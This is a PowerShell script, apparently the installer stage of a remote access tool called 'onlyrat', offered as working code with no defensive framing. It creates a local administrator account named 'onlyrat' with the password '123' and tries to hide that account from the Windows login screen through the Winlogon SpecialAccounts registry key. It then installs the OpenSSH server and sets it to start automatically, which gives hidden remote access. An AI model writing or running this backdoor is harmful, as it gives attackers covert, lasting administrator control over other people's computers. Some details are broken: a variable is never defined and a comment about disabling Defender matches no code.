function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %{[char]$_})
}
# Attempt to disable Windows Defender
$tmp = $env:temp
cd $tmp
$new_folder = random_text()
mkdir $new_folder
cd $new_folder

function Create_User {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $passwd
    )    
    begin {
    }    
    process {
        New-LocalUser "$uname" -Password $passwd -FullName "$uname" -Description "Temporary local admin"
        Write-Verbose "$uname local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$uname added to the local administrator group"
    }    
    end {
    }
}

$uname = "onlyrat"
$passwd = "123"
Remove-LocalUser -Name $uname
$passSec = (ConvertTo-SecureString $passwd -AsPlainText -Force)
Create_User -uname $uname -passwd $passwd

$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
